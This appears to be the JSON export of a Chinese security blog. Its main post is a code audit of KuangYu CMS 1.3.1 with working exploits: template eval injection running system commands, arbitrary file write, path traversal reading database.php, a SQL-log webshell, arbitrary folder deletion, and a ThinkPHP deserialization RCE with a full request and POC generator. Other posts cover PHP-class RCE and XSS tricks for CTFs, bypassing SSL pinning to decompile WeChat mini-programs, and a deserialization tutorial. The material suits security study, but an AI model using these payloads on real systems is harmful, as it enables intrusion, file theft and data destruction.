{"meta":{"title":"spaceman'blog","subtitle":"","description":"","author":"spaceman","url":"https://spaceman-911.gitee.io","root":"/"},"pages":[{"title":"404","text":"1&lt;style type=&quot;text/css&quot;&gt; .article-header &#123; padding: 0; padding-top: 26px; border-left: none; text-align: center; &#125; .article-header:hover &#123; border-left: none; &#125; .article-title &#123; font-size: 2.1em; &#125; strong a &#123; color: #747474; &#125; .article-meta &#123; display: none; &#125; .share &#123; display: none; &#125; .ds-meta &#123; display: none; &#125; .player &#123; margin-left: -10px; &#125; .sign &#123; text-align: right; font-style: italic; &#125; #page-visit &#123; display: none; &#125; .center &#123; text-align: center; height: 2.5em; font-weight: bold; &#125; .article-entry hr &#123; margin: 0; &#125; .pic &#123; text-align: center; margin: 0; &#125; .pic br &#123; display: none; &#125; #container .article-info-post.article-info &#123; display: none; &#125; #container .article .article-title &#123; padding: 0; &#125;&lt;/style&gt;","path":"/404.html","date":"02-11","excerpt":""},{"title":"About","text":"CTF：会一点 web、misc 渗透：会一点工具的使用和一点实战 团队：F12sec 特长：划水、脚本梭哈 QQ：1006848997","path":"about/index.html","date":"02-10","excerpt":""},{"title":"分类","text":"","path":"categories/index.html","date":"02-10","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"02-10","excerpt":""},{"title":"CVE","text":"这个 bug 暂时不会修","path":"tags/index.html","date":"02-10","excerpt":""}],"posts":[{"title":"狂雨CMS1.3.1代码审计","text":"# 狂雨 CMS1.3.1 审计 # 简介 狂雨 cms 是款小说 cms，狂雨小说内容管理系统（简称 KYXSCMS）提供一个轻量级小说网站解决方案，基于 ThinkPHP5.1+MySQL 的技术开发（如果还不了解 TP 框架的小伙伴可以先去了解了解大概的 MVC 模式）。KYXSCMS, 灵活，方便，人性化设计简单易用是最大的特色，是快速架设小说类网站首选，只需 5 分钟即可建立一个海量小说的行业网站，批量采集目标网站数据或使用数据联盟，即可自动采集获取大量数据。内置标签模版，即使不懂代码的前端开发者也可以快速建立一个漂亮的小说网站。 # 环境准备 cms 下载地址：http://bbs.kyxscms.com/?s=ajax/downfile/id/1007 phpstudy pro ：https://www.xp.cn/download.html 服务器环境：Mysql5.7 + Nginx1.15.11 伪静态规则： 12345location &#x2F; &#123; if (!-e $request_filename)&#123; rewrite ^(.*)$ &#x2F;index.php?s&#x3D;$1 last; break; &#125; &#125; 配置数据库，按步骤安装环境即可。 # 漏洞复现 由于是用 thinkphp 框架开发的，所以以下的一些 MVC 就不细讲了，还不了解这个框架的师傅需要先去了解哈 # 文件包含 网站 logo 上传图片马 编辑模板 添加如下代码 1&#123;include file&#x3D;&quot;uploads&#x2F;config&#x2F;20210420&#x2F;fa4170cbe1481d36c77a25d3e90f5947.png&quot; &#x2F;&#125; 访问主页成功包含 # 命令执行 编辑模板 添加一下内容 1&#123;$Think.get.spaceman|eval&#125; 保存后，去首页就可以执行命令了 1&#x2F;?spaceman&#x3D;system(&#39;dir&#39;); # 任意文件写入 点击编辑模板，bp 抓包 将参数修改如下 1content&#x3D;&lt;?php phpinfo();?&gt;&amp;path&#x3D;public&#x2F;566.php 成功 getshell # 目录遍历 点击编辑的时候抓包，修改参数 path 的值 原参数 读取网站根目录上层目录 1&#x2F;admin&#x2F;template&#x2F;lists&#x2F;path&#x2F;%252E%252E%252F 读取 public 目录 1&#x2F;admin&#x2F;template&#x2F;lists&#x2F;path&#x2F;%252E%252Fpublic # 任意文件读取 点击编辑的时候抓包，修改参数 path 的值 原参数 读取 database.php 1http:&#x2F;&#x2F;kycms.com&#x2F;admin&#x2F;template&#x2F;edit&#x2F;path&#x2F;config%252Fdatabase%252Ephp.html 例如读取根目录的文件，这里我写了一个 12.txt 1http:&#x2F;&#x2F;kycms.com&#x2F;admin&#x2F;template&#x2F;edit&#x2F;path&#x2F;%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F12%252Etxt # sql 代码执行 可以执行 sql 语句，因为系统提供了 sql 语句查询，但是需要一句一句运行 若是 root 权限直接可以开启日志，然后使用日志 getshell 1234set global general_log &#x3D; &quot;ON&quot;;set global general_log_file&#x3D;&#39;F:&#x2F;MyApplication&#x2F;phpstudy_pro&#x2F;WWW&#x2F;kycms.com&#x2F;public&#x2F;123.php&#39;;create table spaceman (shell varchar(25));insert into spaceman (shell) values (&quot;&lt;?php phpinfo(); ?&gt;&quot;); 使用 select 不记录，123.php 内容如下 getshell # 任意文件夹删除 首先在 \\template\\home 目录下创建一个用来测试删除的目录 一个文件夹放在 \\template 目录下 接着先看一下数据库中的模板表 可以看到这个命名和上面模板的目录名字一样 接着借助后台的 sql 功能给该表添加一下数据，一条一条运行 123insert into ky_template values(&#x27;56&#x27;,&#x27;test56&#x27;,&#x27;测试56&#x27;,&#x27;1&#x27;,&#x27;spaceman&#x27;,&#x27;5.0.6&#x27;,&#x27;0&#x27;,&#x27;web&#x27;,&#x27;0&#x27;)insert into ky_template values(&#x27;899&#x27;,&#x27;../test899&#x27;,&#x27;测试899&#x27;,&#x27;1&#x27;,&#x27;spaceman&#x27;,&#x27;5.0.6&#x27;,&#x27;0&#x27;,&#x27;web&#x27;,&#x27;0&#x27;) 此时我们就可以看到模板中多出了两个 当我们点击删除的啥时候，相应的文件夹（就是图中的标识名）就会被删除 可以看到两个文件夹均已被删除，所以使用 sql 插入时可以指定文件夹即可任意删除 # 命令执行 2 首先需要注册一个普通会员账号，然后登录，构造请求如下 1234567891011GET /user/Recentread/del?id=1&amp;spaceman[]=whoami HTTP/1.1Host: kycms.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: lf___forward__=%2F; lf_user_auth=think%3A%7B%22uid%22%3A%221%22%2C%22username%22%3A%22test%22%7D; lf_user_auth_sign=b5b4192a5245a31f8a0c1c387d6d3894233999bc; lf_user_recommend=1653285240; lf_read_log=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A8%3A%22spaceman%22%3Ba%3A0%3A%7B%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22spaceman%22%3BO%3A13%3A%22think%5CRequest%22%3A3%3A%7Bs%3A7%3A%22%00%2A%00hook%22%3Ba%3A1%3A%7Bs%3A7%3A%22visible%22%3Ba%3A2%3A%7Bi%3A0%3Br%3A7%3Bi%3A1%3Bs%3A6%3A%22isAjax%22%3B%7D%7Ds%3A9%3A%22%00%2A%00filter%22%3Bs%3A6%3A%22system%22%3Bs%3A6%3A%22config%22%3Ba%3A1%3A%7Bs%3A8%3A%22var_ajax%22%3Bs%3A8%3A%22spaceman%22%3B%7D%7D%7D%7D%7D%7DUpgrade-Insecure-Requests: 1 # 漏洞分析 # 文件包含 主要代码 edit 方法 123456789101112131415161718192021application/admin/controller/Template.phppublic function edit()&#123; $Template=model(&#x27;template&#x27;); $data=$this-&gt;request-&gt;post(); if($this-&gt;request-&gt;isPost())&#123; $res = $Template-&gt;edit($data); if($res !== false)&#123; return $this-&gt;success(&#x27;模版文件修改成功！&#x27;,url(&#x27;index&#x27;)); &#125; else &#123; $this-&gt;error($Template-&gt;getError()); &#125; &#125;else&#123; $path=urldecode($this-&gt;request-&gt;param(&#x27;path&#x27;)); $info=$Template-&gt;file_info($path); $this-&gt;assign(&#x27;path&#x27;,$path); $this-&gt;assign(&#x27;content&#x27;,$info); $this-&gt;assign(&#x27;meta_title&#x27;,&#x27;修改模版文件&#x27;); return $this-&gt;fetch(); &#125;&#125; 可以看到对 $res 进行了判断，所以跟进 model (‘template’) 中的 edit 方法 12345application/admin/model/Template.phppublic function edit($data)&#123; return File::put($data[&#x27;path&#x27;],$data[&#x27;content&#x27;]);&#125; 跟进 File 类 put 方法 12345678910111213extend/org/File.phpstatic public function put($filename,$content,$type=&#x27;&#x27;)&#123; $dir = dirname($filename); if(!is_dir($dir)) mkdir($dir,0755,true); if(false === file_put_contents($filename,$content))&#123; throw new \\think\\Exception(&#x27;文件写入错误:&#x27;.$filename); &#125;else&#123; self::$contents[$filename]=$content; return true; &#125;&#125; 此时到这里已经是完成处理了，直接就是写入，毫无过滤，那么不难发现这里可能还会存在一个任意文件写入的漏洞，因为直接将内容写入，参数也可控 # 命令执行 如文件包含的分析，并没有进行什么过滤，所以可以直接使用 thinkphp 模板的变量输出 模板变量输出参考：https://www.kancloud.cn/manual/thinkphp5_1/354071 # 任意文件写入 正如文件包含的分析，直接使用 file_put_contents 写入文件，参数可控，本想读取文件的最后导致任意文件写入 # 目录遍历 主要代码 12345678910application/admin/controller/Template.phppublic function lists($path)&#123; $Template=model(&#x27;template&#x27;); $list_info=$Template-&gt;file_list(urldecode($path)); $this-&gt;assign(&#x27;top_dir&#x27;,dirname(urldecode($path))); $this-&gt;assign(&#x27;list&#x27;,$list_info); $this-&gt;assign(&#x27;meta_title&#x27;,&#x27;模版管理&#x27;); return $this-&gt;fetch();&#125; 可以看到先是对传入的 path 参数使用 urldecode 函数解码一次，所以参数值在传入的时候 url 编码了两次，接着跟进 model (‘template’) 中的 file_list 方法， 123456789101112131415161718192021application/admin/model/Template.phppublic function file_list($path,$is_all=FALSE,$exts=&#x27;*&#x27;)&#123; $file_info=[]; $list_info=File::list_dir_info($path,$is_all,$exts); foreach ($list_info as $key =&gt; $value) &#123; $file_info[$key]=File::list_info($value); if($file_info[$key][&#x27;isFile&#x27;])&#123; $file_info[$key][&#x27;extensions&#x27;]=$this-&gt;extensions[$file_info[$key][&#x27;ext&#x27;]]; $file_info[$key][&#x27;template_type&#x27;]=@$this-&gt;template_type[$file_info[$key][&#x27;filename&#x27;]]; if(!$file_info[$key][&#x27;template_type&#x27;])&#123; $file_info[$key][&#x27;template_type&#x27;]=&#x27;其它模版&#x27;; &#125; &#125;else&#123; $file_info[$key][&#x27;extensions&#x27;]=&#x27;folder&#x27;; $file_info[$key][&#x27;template_type&#x27;]=&#x27;文件夹&#x27;; &#125; &#125; return $file_info;&#125; 跟进 File 类 list_info 方法 123456789101112131415161718192021222324static public function list_info($file)&#123; $dir = array(); $dir[&#x27;filename&#x27;] = basename($file);//返回路径中的文件名部分。 $dir[&#x27;pathname&#x27;] = realpath($file);//返回绝对路径名。 $dir[&#x27;owner&#x27;] = fileowner($file);//文件的 user ID （所有者）。 $dir[&#x27;perms&#x27;] = fileperms($file);//返回文件的 inode 编号。 $dir[&#x27;inode&#x27;] = fileinode($file);//返回文件的 inode 编号。 $dir[&#x27;group&#x27;] = filegroup($file);//返回文件的组 ID。 $dir[&#x27;path&#x27;] = dirname($file);//返回路径中的目录名称部分。 $dir[&#x27;atime&#x27;] = fileatime($file);//返回文件的上次访问时间。 $dir[&#x27;ctime&#x27;] = filectime($file);//返回文件的上次改变时间。 $dir[&#x27;perms&#x27;] = fileperms($file);//返回文件的权限。 $dir[&#x27;size&#x27;] = filesize($file);//返回文件大小。 $dir[&#x27;type&#x27;] = filetype($file);//返回文件类型。 $dir[&#x27;ext&#x27;] = is_file($file) ? pathinfo($file,PATHINFO_EXTENSION) : &#x27;&#x27;;//返回文件后缀名 $dir[&#x27;mtime&#x27;] = filemtime($file);//返回文件的上次修改时间。 $dir[&#x27;isDir&#x27;] = is_dir($file);//判断指定的文件名是否是一个目录。 $dir[&#x27;isFile&#x27;] = is_file($file);//判断指定文件是否为常规的文件。 $dir[&#x27;isLink&#x27;] = is_link($file);//判断指定的文件是否是连接。 $dir[&#x27;isReadable&#x27;] = is_readable($file);//判断文件是否可读。 $dir[&#x27;isWritable&#x27;] = is_writable($file);//判断文件是否可写。 $dir[&#x27;isUpload&#x27;] = is_uploaded_file($file);//判断文件是否是通过 HTTP POST 上传的。 return $dir;&#125; 可以看到做一些判断后直接返回内容，并没有什么过滤，导致目录遍历 # 任意文件读取 主要代码 123456789101112131415161718192021application/admin/controller/Template.phppublic function edit()&#123; $Template=model(&#x27;template&#x27;); $data=$this-&gt;request-&gt;post(); if($this-&gt;request-&gt;isPost())&#123; $res = $Template-&gt;edit($data); if($res !== false)&#123; return $this-&gt;success(&#x27;模版文件修改成功！&#x27;,url(&#x27;index&#x27;)); &#125; else &#123; $this-&gt;error($Template-&gt;getError()); &#125; &#125;else&#123; $path=urldecode($this-&gt;request-&gt;param(&#x27;path&#x27;)); $info=$Template-&gt;file_info($path); $this-&gt;assign(&#x27;path&#x27;,$path); $this-&gt;assign(&#x27;content&#x27;,$info); $this-&gt;assign(&#x27;meta_title&#x27;,&#x27;修改模版文件&#x27;); return $this-&gt;fetch(); &#125;&#125; 因为是 get 传输，所以不执行 if 语句，所以我们直接查看 else 即可，可以看到同样先是对传入的 path 参数使用 urldecode 函数解码一次，然后再使用 model (‘template’) 中的 file_info 方法进行处理 跟进 file_info 方法 12345application/admin/model/Template.phppublic function file_info($path)&#123; return File::read($path);&#125; 跟进 File 类 read 方法 12345extend/org/File.phpstatic public function read($filename,$type=&#x27;&#x27;)&#123; return self::get($filename,&#x27;content&#x27;,$type);&#125; 继续跟进 get 方法 1234567891011121314extend/org/File.phpstatic public function get($filename,$name,$type=&#x27;&#x27;)&#123; if(!isset(self::$contents[$filename]))&#123; if(!is_file($filename)) return false; self::$contents[$filename]=file_get_contents($filename); &#125; $content=self::$contents[$filename]; $info = array( &#x27;mtime&#x27; =&gt; filemtime($filename), &#x27;content&#x27; =&gt; $content ); return $info[$name];&#125; 可以看到最后也是将文件读取放到 $content 中，然后返回，然后 edit 也是直接输出，也没有过滤，导致任意文件读取 # sql 代码执行 主要代码 123456789101112131415161718192021application/admin/controller/Tool.phppublic function sqlexecute()&#123; if($this-&gt;request-&gt;isPost())&#123; $sql=$this-&gt;request-&gt;param(&#x27;sql&#x27;); if(!empty($sql))&#123; $sql = str_replace(&#x27;&#123;pre&#125;&#x27;,Config::get(&#x27;database.prefix&#x27;),$sql); //查询语句返回结果集 if(strtolower(substr($sql,0,6))==&quot;select&quot;)&#123; &#125; else&#123; $return = Db::execute($sql); &#125; &#125; return $this-&gt;success(&#x27;执行完成&#x27;); &#125;else&#123; $this-&gt;assign(&#x27;meta_title&#x27;,&#x27;SQL语句执行&#x27;); return $this-&gt;fetch(); &#125;&#125; 可以看到直接是执行 sql 语句，之所以不用 select 写入日志是因为第三个 if 直接判断前六个字符是不是 select，如果是直接啥也不执行，就直接 return，而其他会执行，所以才使用了 insert 语句 # 任意文件夹删除 主要代码 123456789101112131415application/admin/controller/Template.phppublic function del()&#123; $id = array_unique((array)$this-&gt;request-&gt;param(&#x27;id&#x27;)); if ( empty($id) ) &#123; $this-&gt;error(&#x27;请选择要操作的数据!&#x27;); &#125; $Template=model(&#x27;template&#x27;); $res = $Template-&gt;del($id); if($res !== false)&#123; $this-&gt;success(&#x27;删除成功&#x27;); &#125; else &#123; $this-&gt;error($Template-&gt;getError()); &#125;&#125; 跟进 model (‘template’) 12345678910111213141516application/admin/model/Template.phppublic function del($id)&#123; $map = [&#x27;id&#x27; =&gt; $id]; $name = Template::where($map)-&gt;column(&#x27;name&#x27;); foreach ($name as $value) &#123; del_dir_file(&#x27;./&#x27;.config(&#x27;web.default_tpl&#x27;).DIRECTORY_SEPARATOR.$value,true); &#125; $result = Template::where($map)-&gt;delete(); if(false === $result)&#123; $this-&gt;error=Template::getError(); return false; &#125;else&#123; return $result; &#125;&#125; 先是查找 ky_template 表中相应的 id 的 name 字段，然后使用 del_dir_file 方法删除该目录 12345678910111213141516171819202122application/common.phpfunction del_dir_file($path, $delDir = FALSE) &#123; if(is_dir($path))&#123; $handle = opendir($path); if ($handle) &#123; while (false !== ( $item = readdir($handle) )) &#123; if ($item != &quot;.&quot; &amp;&amp; $item != &quot;..&quot;) is_dir(&quot;$path/$item&quot;) ? del_dir_file(&quot;$path/$item&quot;, $delDir) : unlink(&quot;$path/$item&quot;); &#125; closedir($handle); if ($delDir) return rmdir($path); &#125;else &#123; if (file_exists($path)) &#123; return unlink($path); &#125; else &#123; return FALSE; &#125; &#125; &#125;&#125; 单步调试如下，465 即 ky_template 表中 name 字段值 通过单步调试可以看到这个助手函数 config (‘web.default_tpl’) 的值应该是 template/home ，所以当 name 为 …/456 时可以目录穿越，导致任意文件夹均可删除，还有 DIRECTORY_SEPARATOR 是 PHP 的内部常量，是一个显示系统分隔符的命令，具体可以查看（https://www.php.cn/php-weizijiaocheng-374148.html） # 任意命令执行 2 该漏洞为 thinkphp 版本的反序列化漏洞，漏洞原理就不再叙述，想了解的师傅可以参考 https://zhuanlan.zhihu.com/p/86289184，只说漏洞利用点，既然是反序列化漏洞，那就直接搜索 unserialize 函数即可 可以看到是 model Recentread 中含有 unserialize 函数，查看 controller 传输过程 所以将序列化后的 poc 放入 read_log 参数即可 poc 生成文件内容如下，直接放入网站根目录即可 1234567891011121314151617181920212223242526272829303132333435363738&lt;?php namespace think;class Request &#123; protected $hook = []; protected $filter = &quot;system&quot;; function __construct() &#123; $this-&gt;filter = &quot;system&quot;; $this-&gt;config = [&quot;var_ajax&quot; =&gt; &#x27;spaceman&#x27;]; $this-&gt;hook = [&quot;visible&quot; =&gt; [$this,&quot;isAjax&quot;]]; &#125; &#125;abstract class Model &#123; protected $append = []; private $data = []; function __construct() &#123; $this-&gt;append = [&quot;spaceman&quot; =&gt; []]; $this-&gt;data = [&quot;spaceman&quot; =&gt; new Request()]; &#125; &#125;namespace think\\model; use think\\Model; class Pivot extends Model &#123;&#125;namespace think\\process\\pipes; use think\\model\\Pivot; class Windows &#123; private $files = []; public function __construct() &#123; $this-&gt;files = [new Pivot()]; &#125; &#125;echo urlencode(serialize(new Windows()));","path":"2022/05/23/狂雨CMS1-3-1代码审计/","date":"05-23","excerpt":"","tags":[{"name":"PHP","slug":"PHP","permalink":"https://spaceman-911.gitee.io/tags/PHP/"},{"name":"代码审计","slug":"代码审计","permalink":"https://spaceman-911.gitee.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"Xposed+JustTrustMe关闭SSL证书验证【抓包】","text":"# Xposed+JustTrustMe 关闭 SSL 证书验证【抓包】 这次是将打包好的模拟器分享一下，需要夜神模拟器打开，该备份的安卓 5 已经安装了 Xposed+JustTrustMe ，还有 RE文件管理器 ，可用于抓取小程序包与获取小程序源码包（需反编译） 链接：https://pan.baidu.com/s/1CMNG5K6YTgwkAoyipxxABA 提取码：f12s 夜神模拟器官网：https://www.yeshen.com/ 下载好直接将模拟器导入即可 开机密码是：123456 简单介绍一下怎么用，首先是抓取小程序数据包 先打开 Bp，设置监听，指定地址选择的是自己电脑的 IP 地址 然后在模拟器里面设置代理，设置成 Bp 的 ip 和端口 先打开 WLAN，然后鼠标长按该网络，然后点击修改网络 点击高级选项 将 IP 和端口设置成 Bp 监听的 然后就可以正常抓包了，打开 app 或者小程序即可正常抓包了，但不是所有的 app 都能抓 讲完小程序的抓包，再说小程序的反编译，首先登陆微信打开小程序，然后打开 RE 文件管理器，文件所在的目录为 安卓： /data/data/com.tencent.mm/MicroMsg/[一个 32 位的 16 进制字符串名文件夹]/appbrand/pkg/ 找到一个以 wxapkg 为后缀的文件 如果文件很多怎么找到这个文件呢，那就是 把所有的小程序都删除，留一个，剩下的这个文件就是这个小程序的了 看文件日期，刚刚打开的小程序是最新的 然后再将这个文件复制出来反编译即可，那么模拟器也是可以直接快速共享的，模拟器的左侧按钮 将该文件复制至安卓共享路径，然后打开电脑共享路径即可看到了 接下来就是逆向工具了，可以使用命令模式的 wxappUnpacker 逆向工具地址：https://github.com/xuedingmiaojun/wxappUnpacker 该工具需要下载 Node js，官网：https://nodejs.org/zh-cn/download/ 安装好 node 后，配置相应的环境，有问题的直接百度即可解决，这里就不在啰嗦 工具安装与使用说明也都写在里面了，安装完成就可以用工具逆向小程序了，如下 然后可以使用微信开发者工具（https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html）动态调试，直接导入即可 当然也有大佬写好的反编译 GUI 工具（https://github.com/ezshine/wxapkg-convertor/releases） 可根据自己的需要下载相应的版本，这个操作就很简单，直接将 wxapkg 拖入程序里即可直接在 wxapkg 文件所在的目录下生成同名的文件夹 反编译成功后直接就可以使用微信开发者工具进行调试了，可以说非常方便，如何遇到什么 微信小程序报错：不在以下 request 合法域名列表中 ，则可点击右侧的详情，勾选 若想挖到洞 则需要不断尝试与挖掘，祝师傅们新年快乐！","path":"2022/01/29/Xposed-JustTrustMe关闭SSL证书验证【抓包】/","date":"01-29","excerpt":"","tags":[{"name":"资源","slug":"资源","permalink":"https://spaceman-911.gitee.io/tags/%E8%B5%84%E6%BA%90/"}]},{"title":"PHP中拼接调用的类","text":"# PHP 中拼接调用的类 不催我就懒得更，毕竟也没人看，所以就懒得更新… 这里主要是分享 ctf 中一些常见的拼接调用的类，记得哪个就先写哪个，遇到再慢慢更新 首先是代码中可能遇到的 1new $this-&gt;a($this-&gt;b); 这里假设 a 和 b 是可控的，那我们就可以使用 php 自带的类做一些事情 1234567SplFileObjectFilesystemIteratorDirectoryIteratorReflectionClassReflectionMethodGlobIteratorException # SplFileObject 首先是官网给的用法和介绍：https://www.php.net/manual/zh/class.splfileobject.php 简单的演示一下： 123456&lt;?php$context = new SplFileObject(&quot;test.txt&quot;);foreach($context as $f)&#123; echo $f;&#125;?&gt; test.txt 文件内容 读取结果 但是如果只有 1echo new $this-&gt;a($this-&gt;b); 这样只会显示第一行的内容 那如果遇到的只有这个怎么办呢，可以使用 php://filter 来读取 1234&lt;?php$class = &quot;SplFileObject&quot;;$file = &quot;php://filter/read=convert.base64-encode/resource=test.txt&quot;;echo new $class($file); 就可以获得 base64 编码后的内容了 # FilesystemIterator 官方用法和介绍：https://www.php.net/manual/en/class.filesystemiterator.php 同样简单演示一下： 123456&lt;?php$context = new FilesystemIterator(&quot;./&quot;);foreach($context as $f)&#123; echo $f;&#125;?&gt; 但如果只是直接 echo，就只能读取第一个文件名 1234&lt;?php$class = &quot;FilesystemIterator&quot;;$dir = &quot;./&quot;;echo new $class($dir); 至于怎么全部读取，这个我暂时不知道没有没有办法，但是可以一个一个试，那就是可以利用 glob:// glob:// 官方文档：https://www.php.net/manual/zh/wrappers.glob.php 1234&lt;?php$class = &quot;FilesystemIterator&quot;;$dir = $_GET[&#x27;a&#x27;];echo new $class($dir); 那么尝试查看 f 开头的文件就可以这样 f* ，因为 glob 协议支持通配符 但是默认只能读取第一个，所以想要读取第二个可以再尝试 剩下的也就是不断尝试了，这里就不继续测试。 # DirectoryIterator 官方手册：https://www.php.net/manual/zh/class.directoryiterator.php 利用方式和上面的 FilesystemIterator 一样，也是利用 glob 协议配合读取文件名 1234&lt;?php$class = &quot;DirectoryIterator&quot;;$dir = $_GET[&#x27;a&#x27;];echo new $class($dir); # GlobIterator 官方文档：https://www.php.net/globiterator 1234&lt;?php$class = &quot;GlobIterator&quot;;$dir = $_GET[&#x27;a&#x27;];echo new $class($dir); 用法就是直接不需要再用 glob 协议配合 # ReflectionClass 官方文档：https://www.php.net/manual/zh/class.reflectionclass.php 例如直接执行命令 1234&lt;?phperror_reporting(0);echo new ReflectionClass(system(&#x27;whoami&#x27;));?&gt; 关闭报错也可以有输出，只是会有提示而已 即使后面多了 ()，但是也不用影响 12345&lt;?phphighlight_file(__FILE__);error_reporting(0);echo new ReflectionClass(system(&#x27;whoami&#x27;)());?&gt; 但是直接赋值然后使用 echo 是不能触发的 1234567&lt;?phphighlight_file(__FILE__);$class = &quot;ReflectionClass&quot;;$cmd = &quot;system(&#x27;whoami&#x27;)&quot;;echo new $class($cmd);?&gt; 如果外面加一个 eval 就可以 # ReflectionMethod 官方文档：https://www.php.net/manual/zh/class.reflectionmethod.php 测试如 ReflectionClass 方式触发 RCE 1234567&lt;?phphighlight_file(__FILE__);$class = &quot;ReflectionMethod&quot;;$cmd = &quot;system(&#x27;whoami&#x27;)&quot;;eval(&quot;echo new $class($cmd);&quot;);?&gt; # Exception 官方文档：https://www.php.net/manual/zh/class.exception.php Exception 是所有异常的基类。 直接上例子，跟 Exception 一样的利用方式： 1234567&lt;?phphighlight_file(__FILE__);$class = &quot;Exception&quot;;$cmd = &quot;system(&#x27;whoami&#x27;)&quot;;eval(&quot;echo new $class($cmd);&quot;);?&gt; 去掉 eval 是不行的，但是 Reflection 有 __toString 方法，例如 1234567&lt;?phphighlight_file(__FILE__);$class = &quot;Exception&quot;;$cmd = &quot;&lt;h1&gt;spaceman&lt;/h1&gt;&quot;;echo new $class($cmd);?&gt; 同样也支持 js 1234567&lt;?phphighlight_file(__FILE__);$class = &quot;Exception&quot;;$cmd = &quot;&lt;script&gt;alert(&#x27;Spaceman&#x27;)&lt;/script&gt;&quot;;echo new $class($cmd);?&gt; 这次就先写这么多吧，之后再慢慢补上，感谢各位师傅的支持。","path":"2021/10/23/PHP中拼接调用的类/","date":"10-23","excerpt":"","tags":[{"name":"PHP","slug":"PHP","permalink":"https://spaceman-911.gitee.io/tags/PHP/"}]},{"title":"PHP-反序列化（超细的）","text":"# PHP - 反序列化（超细的） 很多小伙伴都催更了，先跟朋友们道个歉，摸鱼太久了，哈哈哈，今天就整理一下大家遇到比较多的 php 反序列化，经常在 ctf 中看到，还有就是审计的时候也会需要，这里我就细讲一下，我建议大家自己复制源码去搭建运行，只有自己去好好理解，好好利用了才更好的把握，才能更快的找出 pop 链子，首先呢反序列化最重要的就是那些常见的魔法函数，很多小伙伴都不知道这个魔法函数是干啥的，今天我就一个一个，细致的讲讲一些常见的魔法函数，以及最后拿一些 ctf 题举例，刚开始需要耐心的看，谢谢大家的关注，我会更努力的。 常见的 PHP 魔术方法： 1234567891011__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。__call：当调用对象中不存在的方法会自动调用该方法。__get()：获取对象不存在的属性时执行此函数。__set()：设置对象不存在的属性时执行此函数。 __toString：当对象被当做一个字符串使用时调用。__sleep：序列化对象之前就调用此方法(其返回需要一个数组)__wakeup：反序列化恢复对象之前调用该方法__isset()：在不可访问的属性上调用isset()或empty()触发__unset()：在不可访问的属性上使用unset()时触发__invoke() ：将对象当作函数来使用时执行此方法 # __construct 与 __destruct __construct ： 在创建对象时候初始化对象，一般用于对变量赋初值。 __destruct ： 和构造函数相反，当对象所在函数调用完毕后执行。 例： 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpclass Test&#123; public $name; public $age; public $string; // __construct：实例化对象时被调用.其作用是拿来初始化一些值。 public function __construct($name, $age, $string)&#123; echo &quot;__construct 初始化&quot;.&quot;&lt;br&gt;&quot;; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;string = $string; &#125; // __destruct：当删除一个对象或对象操作终止时被调用。其最主要的作用是拿来做垃圾回收机制。 /* * 当对象销毁时会调用此方法 * 一是用户主动销毁对象，二是当程序结束时由引擎自动销毁 */ function __destruct()&#123; echo &quot;__destruct 类执行完毕&quot;.&quot;&lt;br&gt;&quot;; &#125;&#125;// 主动销毁$test = new Test(&quot;Spaceman&quot;,566, &#x27;Test String&#x27;);unset($test);// 主动销毁先执行__destruct再执行下面的echoecho &#x27;566&#x27;.&#x27;&lt;br&gt;&#x27;;echo &#x27;----------------------&lt;br&gt;&#x27;;// 程序结束自动销毁$test = new test(&quot;Spaceman&quot;,566, &#x27;Test String&#x27;);// 自动销毁先执行下面的echo，程序结束才执行__destructecho &#x27;666&#x27;.&#x27;&lt;br&gt;&#x27;;?&gt; 运行结果： 1234567__construct 初始化__destruct 类执行完毕566----------------------__construct 初始化666__destruct 类执行完毕 # __call __call ：当调用对象中不存在的方法会自动调用该方法。 调用某个方法， 若方法存在，则直接调用；若不存在，则会去调用__call 函数。 例： 123456789101112131415161718192021&lt;?phpclass Test&#123; public function good($number,$string)&#123; echo &#x27;存在good方法&#x27;.&#x27;&lt;br&gt;&#x27;; echo $number.&#x27;---------&#x27;.$string.&#x27;&lt;br&gt;&#x27;; &#125; // 当调用类中不存在的方法时，就会调用__call(); public function __call($method,$args)&#123; echo &#x27;不存在&#x27;.$method.&#x27;方法&#x27;.&#x27;&lt;br&gt;&#x27;; var_dump($args); &#125;&#125;$a = new Test();$a-&gt;good(566,&#x27;nice&#x27;);$b = new Test();$b-&gt;spaceman(899,&#x27;no&#x27;);?&gt; 运行结果： 123456789存在good方法566---------nice不存在spaceman方法array(2) &#123; [0] =&gt; int(899) [1] =&gt; string(2) &quot;no&quot;&#125; # __get() __get() ：访问不存在的成员变量时调用的； 用来获取私有属性 读取一个对象的属性时，若属性存在，则直接返回属性值； 若不存在，则会调用__get 函数。 例： 1234567891011121314151617&lt;?phpclass Test &#123; public $n=123; // __get()：访问不存在的成员变量时调用 public function __get($name)&#123; echo &#x27;__get 不存在成员变量&#x27;.$name.&#x27;&lt;br&gt;&#x27;; &#125;&#125;$a = new Test();// 存在成员变量n，所以不调用__getecho $a-&gt;n;echo &#x27;&lt;br&gt;&#x27;;// 不存在成员变量spaceman，所以调用__getecho $a-&gt;spaceman; 运行结果： 12123__get 不存在成员变量spaceman # __set() __set() ：设置不存在的成员变量时调用的； 设置一个对象的属性时， 若属性存在，则直接赋值； 若不存在，则会调用__set 函数。 例： 123456789101112131415161718192021222324252627282930313233343536&lt;?phpclass Test&#123; public $data = 100; protected $noway=0; // 